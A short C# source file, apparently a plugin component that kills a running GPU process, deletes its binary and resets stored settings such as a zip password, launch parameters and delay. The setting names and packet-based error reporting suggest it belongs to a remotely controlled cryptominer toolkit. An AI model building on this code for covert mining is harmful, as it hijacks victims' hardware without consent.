using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Plugin
{
    class Gpu_Del // Gpu_Del.Get();
    {
        public static void Get()
        {
            try
            {
                if (File.Exists(Properties.GPU.Default.gpuBin))
                    foreach (Process p in Process.GetProcessesByName(Properties.GPU.Default.gpuProc))
                    {
                        p.Kill();
                        Thread.Sleep(2000);
                    }
                if (File.Exists(Properties.GPU.Default.gpuBin))
                    File.Delete(Properties.GPU.Default.gpuBin);

                if (!File.Exists(Properties.GPU.Default.gpuBin))

                    Properties.GPU.Default.gpuParametrs = "1"; // Launch parameters
                Properties.GPU.Default.gpuProc = "1"; // In the archive
                Properties.GPU.Default.gpuWorkDir = "1";
                Properties.GPU.Default.gpuZipPass = "1";
                Properties.GPU.Default.gpuDelay = "1";
                Properties.GPU.Default.gpuBin = "1";
                Properties.GPU.Default.gpu_idParameters = "0";
                Properties.GPU.Default.Save(); // Save, then manipulate only them

            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return;
            }
        }
    }
}
